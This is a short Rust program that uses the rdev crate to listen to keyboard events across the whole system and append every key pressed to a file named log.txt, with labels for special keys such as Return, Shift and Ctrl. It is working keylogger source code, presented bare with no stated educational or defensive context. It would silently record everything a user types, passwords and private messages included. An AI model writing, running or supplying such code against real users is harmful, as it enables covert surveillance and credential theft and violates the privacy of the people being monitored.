use rdev::{listen, Event, Key};
use std::fs::OpenOptions;
use std::io::prelude::*;

fn main() {
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }
}

fn callback(event: Event) {
    let mut file = OpenOptions::new()
    .append(true)
    .create(true)
    .open("log.txt")
    .expect("Unable to open log.txt");

    if let Some(key) = event.name {
        let log_entry = match event.event_type {
            rdev::EventType::KeyPress(Key::Return) => format!("{:?} - Key pressed: Return\n", key),
            rdev::EventType::KeyPress(Key::Backspace) => format!("{:?} - Key pressed: Backspace\n", key),
            rdev::EventType::KeyPress(Key::Tab) => format!("{:?} - Key pressed: Tab\n", key),
            rdev::EventType::KeyPress(Key::Space) => format!("{:?} - Key pressed: Space\n", key),
            rdev::EventType::KeyPress(Key::ShiftLeft) | rdev::EventType::KeyPress(Key::ShiftRight) => format!("{:?} - Key pressed: Shift\n", key),
            rdev::EventType::KeyPress(Key::ControlLeft) | rdev::EventType::KeyPress(Key::ControlRight) => format!("{:?} - Key pressed: Ctrl\n", key),
            _ => format!("Key pressed: {}\n", key),
        };

        file.write_all(log_entry.as_bytes()).expect("Failed to write to file");
    }
}
